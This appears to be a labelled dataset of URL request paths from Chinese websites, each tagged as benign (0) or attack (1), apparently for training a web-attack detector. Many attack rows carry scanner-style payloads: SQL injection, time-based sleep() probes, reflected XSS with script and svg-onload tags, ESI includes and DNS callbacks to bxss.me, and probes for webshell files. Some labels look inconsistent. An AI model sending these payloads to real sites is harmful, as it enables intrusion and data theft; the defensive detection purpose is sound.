sentences	labels
/****/czgk/bmyjs/qtdw/zzqtycpglzx/201903/t20190305_1297668.html 	 0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5218\u8fd0\u9f99 	 0
/zwxx_11337/****/202107/t20210714_2923160.html 	 0
/**********/system/2020/06/15/013185874.shtml 	 0
/*******/qiye/b-e2503518.html 	 0
/zwxx_11337/****/201903/t20190313_1310851.html 	 0
/****/rwfc/202011/t20201125_256652.html' and 'x'='y 	 1
/****/consultdetails/angola 	 1
/******/zsn/zyls 	 0
/****/qtgz/201910/t20191011_224095.html 	 0
/******/zz_qtx.jpg 	 0
/**/system/2020/12/17/012104530.shtml 	 0
/****/system/2021/03/13/javascript:window.close(); 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5929\u5a01\u7f51\u5427 	 0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202106/w020210601553550409540.doc 	 0
/****/bmkx/sjsj/202105/t20210518_182686.html 	 0
/****/xxgkml/qtfdxx/zcjd 	 0
/ywly' and 2*3*8=6*8 and 'hbgd'='hbgd/****/jcgc/ 	 1
/zwxx_11337/*******/202108/t20210820_2983996.html 	 0
/****/wzdt<esi:include src=""http://bxss.me/rpb.png""/>/ 	 1
/****/jwmsxf/tthd.html 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u957f\u6c5f\u5927\u4fdd\u62a4\u8fdd\u6cd5\u72af\u7f6a\u6848\u4ef6 	 0
/*******/zwgk/czgk/bmyjs/ 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5b9d\u6e56\u8d85\u5e02 	 0
/****/bmkx/sfgw/202111/w020211110335718396310.jpg 	 0
/**********/system/2021/04/01/013360531.shtml 	 0
/****/yqzt/bsap/" and "x"="x 	 1
/******/system/2007/11/28/002265196.shtml 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6b63\u5143\u9910\u5385 	 0
/****/20201031/e109479364.html 	 0
/*****/gy48/cpgyss.asp?key=\u9ad8\u6548\u6728\u6750\u7834\u788e\ufffd?&l=\ufffd\ufffd\ufffd 	 0
/**********/system/2016/02/09/011931781.shtml 	 0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqtzb/202008/t20200818_2188979.html 	 0
/****/ and 1=1 	 1
/******/classes/swfupload//swfupload_f9.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// 	 1
/****/lzqh/jtdt/index_1.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9526\u6708\u658b\u9762\u9986 	 0
/*****/gy48/cpgyss.asp?key=\u55b7\u6d82\ufffd?&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/b-e488254.html 	 0
/****/bmkx/sswj/201701/t20170120_85065_wap.html 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5143\u5b87\u5b99 	 0
/**********/system/2020/06/07/013179637.shtml 	 0
/******/qqh/dm/mp3/5.mp3 	 0
/***********/zaojianpinglun/?_=1640016091306 	 0
/***/2021/12/13/art_34_248147.html 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5174\u9686\u60e0\u4eae\u517b\u6b96\u7ecf\u7eaa\u4eba 	 0
/***/2021/8/4/art_70_236029.html 	 0
/**********/system/2021/08/06/013431527.shtml 	 0
/*******/qiye/b-e1831317.html 	 0
/zwxx_11337/****/202009/t20200901_2213535.html 	 0
/***/?refresh="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();"" 	 1
/****/丝路/*/-->'""></iframe></script></style></title></textarea><script >alert(07418)</script> 	 1
/****/web/search?page=22&channelid=222832&searchword=\u59dc\u5fd7\u521a&keyword=\u59dc\u5fd7\u521a&perpage=20&outlinepage=10 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u539a\u7cae\u9178\u83dc\u725b\u8089\u9762\u9986 	 0
/**/system/2020/12/04/012098908.shtml 	 0
/zwxx_11337/****/202008/t20200813_2185447.html 	 0
/****/zzxxgk/jjhzj/zsxw/202112/t20211213_197750.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u8f66\u4eab\u90fd\u6c7d\u8f66\u670d\u52a1\u6709\u9650\u516c\u53f8 	 0
/************/template/jcse'""()&%<acx><script >qali(9591)</script>/110105008056111/16/images/style.css 	 1
/****/qzfwj/201901/t20190116_1253298.html 	 0
/****/xqdt/byq/201712/w020171225794109684885.jpg 	 0
/****/qgzfgc/ 	 0
/***/0/02/11/96/2119689_993729.jpg 	 0
/****/mytag_js.php?aid=511348 	 1
/*******/zwgk/czgk/bmyjs/zzqfyxt/dwkqrmfy/ 	 0
/*******/5/hanweb.css 	 1
/***/0/10/03/72/10037247_987771.jpg 	 1
/**/system/2009/08/04/002785803.shtml 	 0
socket.gethostbyname('hitml' 'ubofgxnc965e0.bxss.me.')[3].to_s) '/*******/scrollup/css/themes/image.css 	 1
/****/gjmt/zgsmt/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
/**********/system/2021/12/17/013496047.shtml 	 0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u8bc1\u5927 	 0
/**********/system/2021/01/15/013320372.shtml 	 0
/**********/system/2021/12/19/013496788.shtml 	 0
/******/system/2020/09/21/javascript:window.close(); 	 1
/****/xxgkml/qtfdxx/zdjcyjzj/201610/t20161028_66527.html 	 0
/****/jwmsxf/img/title-min3.png 	 0
/****/ccp_48498/202106/w020210606769879301970.jpg 	 0
/***/003/004/379/00300437997_3f4c156a.png 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtg gywhrepacjgv9ysfcvfq=&openid=ovl7jjsnsvcmuemxrbkel2iqlqvu&outer_str=10727&activate_ticket=fdzv9emqaffrnr3xboqhb3qndmnov366nbuobsknhqpoo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlpj6wkxktpb2hpw4alvpmdk= 	 0
/****/zgsdt/2018_zgsdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/****/bysw/202109/w020210918537407494270.jpg 	 0
/****/b-e463545.html 	 0
/****/wdszs/hfsz/202110/t20211030_196012.html 	 0
/*****/system/2012/07/04/010816619_01.shtml 	 0
/****************/file/getxcxcodeimage?page=pages/login/register&scene=refcustno=102139915&istransparent=true 	 0
/****/zt/yqfkzccs/yqfkdt/index_43.html 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u77f3\u6c9f\u9a7f\u56de\u5473\u9910\u5385 	 0
/****/shzr/202011/t20201125_256647.html?kjcx/qyzz/ 	 0
/***/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
/*****/003/004/440/00300444092_vw00000000000001_6921d062.mp4 	 0
/**/gywm_10175/' and 'x'='x 	 1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u9e3f\u4fe1\u6e90\u79d1\u6280\u670d\u52a1\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u963f\u6770\u6e05\u9999\u9601\u6c49\u9910\u5385 	 0
/****/bmkx/scl/202103/w020210304563522116290.jpg 	 0
/****/zt/2020wznb/gznbzzqrmzfbm/202101/p020210128396559835780.pdf 	 0
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&searchid=1&tpl=16&websiteid=110105008056111 	 1
/*/210514-1/index/06'""()&%<acx><script >t2nb(9882)</script>c5a0c81119dca7da22fc4fd96413d2.js 	 1
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u04a2 \ufffd\ufffd\ufffd\ufffd 	 0
/*****/dsp_editcreative.cfm?attributes.siteid="">alert(777) 	 1
/***/0/00/11/47/114749_687129.jpg 	 0
/****/zgsdt/2011zgsdt/201412/t20141218_42483.html 	 0
/*******/data/fonts/uddatasql.php 	 1
/****/qzfwj/202111/t20211129_3170420.html 	 0
/**/ui/lib/security/bxss.me/t/xss.html? 	 1
/****/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> 	 1
/***/0/01/74/35/1743598_059873.jpg 	 0
/***/0/10/10/34/10103401_241443.jpg 	 0
/****/http://bxss.me/t/xss.html? 	 1
/*******/55q.php 	 1
/***/0/02/12/43/2124367_998404.jpg 	 0
/****/中国?page=1'""()&%<acx><script >hbme(9991)</script> 	 1
/****/石阡县?page=1'""()&%<acx><script >ulqh(9407)</script> 	 1
/***/0/10/68/72/10687268_981875.jpg 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5723\u591a\u65af\u897f\u5f0f\u5feb\u9910\u5e97 	 0
/****/20211129/10806.html 	 0
/****/bmfw/202010/w020201026395926138981.png 	 0
/**/photostore/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
/************/template/jcse/110105008056111/16/bxss.me/jquery.cookie.js 	 1
/****/zzxxgk/jjhzj/gyjzq/gyjzq_3662/201603/t20160302_163523.html 	 0
/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5c0f\u7a0b\u6c7d\u8f66\u7ef4\u4fee 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8363\u76db\u8d85\u7ea7\u5e02\u573a\u6709\u9650\u8d23\u4efb\u516c\u53f8\u957f\u57ce\u4e1c\u8857\u5e97 	 0
/*******/qiye/b-e2132458.html 	 0
/****/czgk/bmyjs/qtdw/zzqmksjy/202002/t20200210_1948591.html 	 0
/******/rss/rssfeed.jsp?colid=34;select pg_sleep(5)-- 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5510\u82b3\u5546\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u56fd\u77f3\u6cb9\u5929\u7136\u6c14\u80a1\u4efd\u6709\u9650\u516c\u53f8\u5b81\u590f\u56fa\u539f\u9500\u552e\u5206\u516c\u53f8\u957f\u57ce\u52a0\u6cb9\u7ad9 	 0
/******/public/2021/09/01/20210901_17ba065c16a_r1.mp4http 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
/**********/tjqh 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u03ac\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/**********/system/2020/04/28/013151063.shtml 	 0
/***/kjcx/kycg/kjjl/ywzzq/yqlj/rlzy/xwzx/rwfc/ 	 0
/**/system/2021/11/26/javascript:void(0); 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u8212\u76ca\u5546\u884c\u4e00\u5206\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5ba2\u54c1\u5148\u7096\u571f\u9e21\u9910\u5385 	 0
/**********/system/2021/11/14/013479837.shtml 	 0
/******/zm-bg.png 	 0
/*****/system/2019/10/18/javascript:void(); 	 1
/****/system/2007/03/12/javascript:window.close(); 	 1
/************/search.do?category=1&cateid=40&p=1&pg=1&q=请输入关键词&tpl=if(now()=sysdate(),sleep(15),0)&websiteid=110105008056111 	 1
/**********/system/2021/12/11/013493023.shtml 	 0
/***/0/01/26/60/1266022_539201.jpg 	 0
/**********/system/more/223000000000000/0012/223000000000000_00001263.shtml 	 0
/****/system/2016/02/07/011931321.shtml 	 0
/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/js/newcalendar/calendar.js 	 1
/***/0/00/08/72/87223_984122.jpg 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' and 4645=6346  	 1
/****/zzxxgk/bmjtj/xxgkml/lzyj_3804/zcfg_1/201704/p020200616352853027163.doc 	 0
/**************/article/201911/201911291439461140.html 	 0
/***/0/02/06/44/2064474_050340.jpg 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u4ef2\u5b8f\u597d\u6536\u6210\u519c\u4e1a\u6280\u672f\u670d\u52a1\u90e8 	 0
/***/images/clbbb.gif 	 0
/*****/system/2007/10/31/002242062.shtml 	 0
/zwxx_11337/****/202004/t20200401_2009172.html 	 0
/******/?fccc'\"><svg/onload=alert(xss)> 	 1
/******/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/layout5.css 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' and 5738=5738  	 1
/***/blockdata/getsearchinfo.do?&title=\u590d\u590d 	 0
/****/xh/hd/201810/t20181009_1104392.html 	 0
/zwxx_11337/****/202009/t20200921_2237813.html 	 0
/****/zzxxgk/tjj/ 	 0
/****/zjdt/kjybzde/gzdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
/******/usercenter/index?qrcode=producttrace&callback=https:/www.yilibabyclub.com/wap/&code=021ud10009jmzm1fmn000n2j9g3ud10v 	 0
/**********/system/2020/08/28/013235822.shtml 	 1
/****/businesses-e28496_4.html?category_id 	 0
/******/system/2008/03/09/002441279.shtml 	 0
/****/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
/'""()&%<acx><script >vmvx(9703)</script>/******/zfczyjs/list.html 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9c7c\u7684\u9519\u5feb\u9910\u5e97 	 0
/****/jquery/images/password.png 	 0
/****/hero_os/search?q="" onmouseover=alert(777) ="" 	 1
/****/dashboard/index/41730?did=4&period=3"">alert(/777/) 	 1
/***********/zaojianpinglun/?_=1640035495906 	 0
/***/dsp_editcreative.cfm?attributes.siteid="">alert(777) 	 1
/****/banner/202106/w020211118435501143750.jpg 	 0
/**/bk422f.html 	 0
/******/system/2020/08/23/013231928.shtml 	 0
/****/b-e570600.html 	 0
/****/201909/t20190926_1757130.html 	 0
/zwxx_11337/***/201812/t20181219_1216978.html 	 0
/****/bmkx/sfgw/202008/w020200806620726235922.png 	 0
/****/20201027/e109232504.html 	 0
/zwxx_11337/****/mtjd/202103/">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a> 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/newcalendar/config.js 	 1
/zwxx_11337/****/201809/t20180904_1030811.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u534f\u805a\u5546\u8d38\u6709\u9650\u516c\u53f8 	 0
/****/mswpmm/common/signin.aspx?cbautosignin=""alert(777) 	 1
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u5934\u8425\u9547\u6768\u90ce\u8857\u9053\u79c0\u5170\u7efc\u5408\u5546\u5e97 	 0
/******/usercenter/index?qrcode=18186 	 0
/********/images/nxrq_search_hotd_02.png?code=17cc9e163e5 	 0
/****/wp-admin/admin-ajax.php 	 1
/****/zt/hjbhdc/202111/t20211122_3141682.html 	 0
/**********/system/2021/10/09/javascript:window.print() 	 1
/**********/system/2020/11/26/javascript:void(); 	 1
/zwxx_11337/****/202106/t20210603_2871387.html 	 0
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx 	 1
/****/202102/t20210203_270235.html 	 0
/**/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/index_1.html 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u785d\u6cb3\u4e61\u9a6c\u7389\u5170\u7efc\u5408\u95e8\u5e02\u90e8 	 0
/**********/system/2021/04/20/013371901.shtml 	 0
/****/index.php?m=member&c=index&a=register&siteid=1 	 1
/************/search/mainframe.do?begin=20201023&end=if(now()=sysdate(),sleep(15),0)&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 	 1
/***/0/01/47/00/1470080_999968.jpg 	 0
/**********/system/more/201000000000000/0048/201000000000000_00004858.shtml 	 0
/***/viewspace-505.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5e7f\u76ca\u5f18\u6cf0\u5546\u8d38\u884c 	 0
/****/qzfwj/202105/t20210510_2832756.html/index_1.html 	 0
/****/tzgg/2021_tzgg/ 	 1
/****/whs/yw_1286/202102/t20210205_2593821.html 	 0
/*********/mtemp/surgeweb/tpl/shared/modules//swfupload_f8.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// 	 1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1104&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2djc2ouahrt&pagename=l2djc2pfbglzdc5qc3a=&newsid=-1 	 0
/******/system/2016/09/19/012135399.shtml 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u806a\u559c\u852c\u83dc\u6c34\u679c\u5e97 	 0
/****/system/2021/08/30/javascript:dozoom(14) 	 1
/****/gjzqq/yz/jpz/201412/w020141212465026364259.gif 	 0
/****/hczqkg-hynews-e108953843.html 	 0
/zwxx_11337/****/202006/t20200612_2136177.html 	 0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5c0f\u998b\u732b\u8089\u5939\u998d\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u7eff\u8272\u5bb6\u56ed\u5bb6\u5ead\u519c\u573a 	 0
/****/bmkx/jyj/201908/t20190816_141205.html 	 0
/**********/system/more/207000000000000/0040/207000000000000_00004027.shtml 	 0
/****/web/search?channelid=234439&orderby=relevance) and 7502=7863#&perpage=24&searchword=1 	 1
/*******/s6h9si.php 	 1
/***/xm/menu/images/sexiao.gif 	 0
/railo-context/*****/update.cfm?admintype=admin<svg/onload=alert(1)> 	 1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1440&h=900&treeid=1099&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul3h6engvexdkei5odg0=&pagename=l3njehdfbglzdc5qc3a=&newsid=-1 	 0
/*******/zwgk/czgk/bmyjs/zzqfyxt/ynxrmfy/ 	 0
/****/zdlygk/ncwywfgz/ycs/hlx/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
/**/news/zz/201810/p020181105511540942210.pdf 	 0
/****/zfwzjs/202011/t20201106_2278802.html 	 0
/****************/notification/negotiate?access_token=ca0528a0-e303-44b0-ad36-f7e4825e0ba5 	 0
/****/xxgknb'||'/2013/list.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5495\u53fd\u70b8\u9e21\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6807\u699c\u6587\u5316\u4f20\u5a92\u6709\u9650\u516c\u53f8 	 0
/************/template/jcse/110105008056111<script >alert(5245);</script >/16/images/layer/layer.js 	 1
/**********/com_banners/models/css.php 	 1
/zwxx_11337/****/202005/t20200509_2075227.html 	 0
/****************/notification/negotiate?access_token=91682649-6c0c-4736-81bc-4d672f035ff8 	 0
/****/czgk/bmjs/zzqjcyxt/hgzdqrmjcy/ 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u634c\u5a01\u670d\u88c5\u5e97 	 0
/****/zfcwhy/'.gethostbyname(lc('hitvt'.'krhjhdaqdd19c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(66).chr(104).chr(80).'/t20210723_2938511.html 	 1
/****/group-summary.jsp?search=test" onmouseover=alert(777) x=" 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u6cd3\u6d0b\u7ba1\u6750\u7ba1\u4ef6\u7ecf\u9500\u90e8 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 2828=2828 and '%'=' 	 1
/****/zzxxgk/tjj/zfxxgkzn_2123/list.html?new=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
/****/zgsdt/zgs16/201608/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqczt/ 	 0
/****/zfxxgknb/\"javascript:void(0)\" 	 1
/******/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 1
/******/system/2021/06/09'""/><iframe src=javascript:alert(2423)>/013399706.shtml 	 1
/****/zdlygk/ncwywfgz/wzs/ltq/if(now()=sysdate(),sleep(12),0).htm 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5b9d\u8587\u5973\u88c5 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u535a\u9633\u6587\u5177\u5e97 	 0
/**********/system/2020/12/17/013304411.shtml 	 0
/****/gjzqq/index.html?continent=%' or 5541=6055 and '%%'='% 	 1
/**********/system/2021/12/02/013488888.shtml 	 0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/plugin/hotnews/js.js 	 1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u534e\u660c\u5de5\u8d38\u516c\u53f8\u5bb6\u7535\u7efc\u5408\u7ecf\u8425\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9884\u65fa\u9547\u5e73\u4ef7\u5546\u5e97 	 0
/zwxx_11337/****/201910/t20191012_1800434.html 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/***/jpage/jquery.jpage.js 	 1
/****/zfwjn/1079/1081/list.html?new=bxss.me/t/xss.html? 	 1
/****/xcx/ldyl/ 	 0
/******/_content/download.jsp?owner=746124344&urltype=0""xor(if(now()=sysdate(),sleep(12),0))xor""z&wbfileid=23735 	 1
/****/zdlygk/ncwywfgz/wzs/if(now()=sysdate(),sleep(12),0)/xmb_gzdxb.htm 	 1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u7231\u7f8e\u7709\u7f8e\u7532\u5de5\u4f5c\u5ba4 	 0
/**/system/2020/11/25/javascript:void(0); 	 1
/****/http://bxss.me/t/fit.txt?.jpg/swsj/ 	 1
/zwxx_11337/****/202001/t20200123_1932338.html 	 0
/**/images/logo.png 	 0
/****/xydt/2016hydt/201606/t20160612_87981.html 	 0
/****/bmkx/sfgw/201804/t20180424_102753.html 	 0
/*****/system/2016/01/06/011905978.shtml 	 0
/****/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin 	 1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u814a\u6c41\u8089\u5939\u998d 	 0
/*********/privacy' and 2*3*8=6*8 and 'bofl'='bofl.aspx 	 1
/****/gbzx/tpbd/ 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(837)</script>?_=1630311611181 	 1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4f1f\u529b\u7845\u94a2\u7247\u52a0\u5de5\u90e8 	 0
/****/compact.cfm?fusebox.ajax="">alert(777) 	 1
/****/whs/yw_1286/202112/t20211205_3196015.html 	 0
/****/idjam8-syxw-e110679927.html 	 0
/**/mavideo/gvideos.php?gid=1 and 1=2 	 1
/**********/system/2020/04/16/013141787.shtml 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u71d5\u5170\u5236\u8863\u95f4 	 0
/******/qhkc/qhx/ 	 0
/****/zzxxgk/jjhzj/gyjzq/pcq_3664/201403/t20140304_165821.html 	 0
/*******/qiye/g5dxks_81_e144462026.html 	 0
/****/byszf/202007/t20200701_168748.html?leader=/xfs.bxss.me 	 1
/**********/system/2020/05/05/013154504.shtml 	 0
/******/nxrq_priv_icon6cur_4.png 	 0
/******/system/2018/01/13/javascript:void(0); 	 1
/**********/system/2020/03/26/013125247.shtml 	 0
/zwxx_11337/*******/202109/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a> 	 0
/****/czgk/bmjs/qtdw/zzqmksjy/\"javascript:void(0)\" 	 1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrthqrikkibtlfzte uabsf0i=&openid=ovl7jjkqwjmjlij86u9r_o4ep3vi&activate_ticket=fdzv9emqaffrnr3xboqhb0jtqftuvmtkfzbujazcx7/oo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbiw0uol9xdzh7rgfoyu4bbmk= 	 0
/****/czgk/bmyjs/rmtt/fl/202002/t20200210_1948935.html 	 0
/****/xydt/2017hydt_6392/index_2.html 	 0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u957f\u8fab\u5b50\u7406\u53d1\u5e97 	 0
/****/tzgg/201907/w020190703311818787540.png 	 0
/zwxx_11337/****/201705/w020170727680002556000.jpg 	 0
socket.gethostbyname(""hitjc"" ""fiiceklq6c003.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/hanweb.css 	 1
/**/files.php?folder="">alert(777) 	 1
/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/201903/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a> 	 0
/******/usercenter/index?qrcode=64772&code=031m9n100hxw0n1xii100kpibb3m9n1b 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtjq3z0pqdtpjbvdxv7sln9y=&openid=ovl7jjg_x7fqdy5nnvhyfyka52de&activate_ticket=fdzv9emqaffrnr3xboqhb0 vtky6/ 2103ptvsrujbxoo8dbj5 fzedtzplsmcaris3hq0csxvvk6sl kk23ydsbvxsdf4ouuaanuaety8k=&code=061ti9ml2jinl84dbsll2agli71ti9mu 	 0
